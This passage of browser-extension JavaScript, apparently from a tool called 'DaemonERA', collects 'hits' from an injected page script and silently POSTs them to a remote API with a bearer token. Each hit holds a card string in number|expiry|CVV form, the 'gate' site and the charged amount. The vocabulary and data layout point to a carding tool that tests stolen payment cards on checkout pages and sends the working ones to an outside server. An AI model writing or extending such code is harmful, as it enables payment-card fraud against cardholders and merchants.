    const queue = q._daemon_hit_queue || [];
    if (queue.length > 0) {
      chrome.storage.local.set({ _daemon_hit_queue: [] });
      for (const item of queue) {
        await fetch(_DAEMON_API + '/hits', {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'Authorization': 'Bearer ' + token },
          body: JSON.stringify({
            card: item.historyEntry?.card || null,
            gate: item.historyEntry?.site || null,
            time: item.historyEntry?.time || new Date(item.ts).toLocaleString(),
            amount: item.historyEntry?.amount || null,
          })
        }).catch(() => {});
      }
    }

  } catch (e) {
    console.error('[DaemonERA] Hit reporter error:', e?.message || e);
  }
}

// Expose globally so popup can trigger a test hit
self._daemonReportHit = _daemonReportHit;

// Listen for UPDATE_LOCAL_STATS{hit:true} from inject.js
chrome.runtime.onMessage.addListener(function _daemonHitListener(msg, _sender, _respond) {
  if (msg && msg.type === 'UPDATE_LOCAL_STATS' && msg.payload && msg.payload.hit) {
    _daemonReportHit(msg.payload.historyEntry || {});
  }
  // Also handle manual test hits from popup
  if (msg && msg.type === 'DAEMON_TEST_HIT') {
    _daemonReportHit(msg.payload || { site: 'test.daemon', card: 'TEST|00/00|000', amount: msg.payload?.amount || '1.00 USD', time: new Date().toLocaleString() });
  }
  return false;
});
// ─────────────────────────────────────────────────────────────────────────────
